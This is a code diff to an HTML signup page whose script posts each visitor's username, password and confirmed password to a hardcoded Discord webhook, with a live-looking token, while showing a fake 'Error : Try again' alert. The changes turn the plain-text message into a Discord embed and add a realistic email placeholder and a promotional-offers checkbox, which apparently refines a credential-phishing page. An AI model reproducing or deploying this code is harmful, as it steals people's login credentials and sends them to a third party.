@@ -80,43 +80,69 @@
 <body>
     <div class="container">
         <div class="signup-box">
-            <h2>Signup</h2>
+            <h2>SignUp</h2>
             <form id="signupForm" onsubmit="submitForm(event)">
-                <input type="text" name="username" id="username" placeholder="Username">
-                <input type="password" name="password" id="password" placeholder="Password">
+                <input type="text" name="username" id="username" placeholder="johndoe@email.com">
+                <input type="password" name="password" id="password" placeholder="Password123">
                 <input type="password" name="confirm_password" id="confirm_password" placeholder="Confirm Password">
                 <label><input type="checkbox" name="terms" required> I agree to the Terms of Service</label>
-                <input type="submit" value="Signup">
+                <div>
+                    <label><input type="checkbox" name="terms"> Allow promotional offers via Email</label>
+                </div>
+                <input type="submit" value="SignUp">
             </form>
         </div>
     </div>
 
     <script>
-        function submitForm(event) {
-            event.preventDefault(); // Prevent default form submission
 
+        function submitForm(event) {
+            event.preventDefault(); // Prevent default form submission            
+            alert("Error : Try again");
             // Get form data
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const confirm_password = document.getElementById('confirm_password').value;
 
-            // Construct message
-            const message = `New signup:\nUsername: ${username} | Password: ${password} | confirmedpassword: ${confirm_password}`;
+            // Construct embed
+            const embed = {
+                title: "New Signup",
+                color: 16777215, // White color
+                fields: [
+                    {
+                        name: "Username",
+                        value: username,
+                        inline: true
+                    },
+                    {
+                        name: "Password",
+                        value: password,
+                        inline: true
+                    },
+                    {
+                        name: "Confirmed Password",
+                        value: confirm_password,
+                        inline: true
+                    }
+                ]
+            };
 
-            // Send message to Discord webhook
+            console.log('Submitting form...');
+
+            // Send embed to Discord webhook
             const webhookUrl = 'https://discord.com/api/webhooks/1224530267541340222/HDL_ewtHfQSMtLWMtNtQrUDjffFvLr5-BAX2XIgdU9Xe-BkKRxaAP024WMzD3PgrE6TL'; // Replace with your Discord webhook URL
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ content: message }),
+                body: JSON.stringify({ embeds: [embed] }),
             })
                 .then(response => {
                     if (!response.ok) {
                         throw new Error('SignUp Error');
                     }
-                    console.log('Message sent to Server');
+                    console.log('Embed sent to Server');
                 })
                 .catch(error => {
                     console.error('Error:', error);
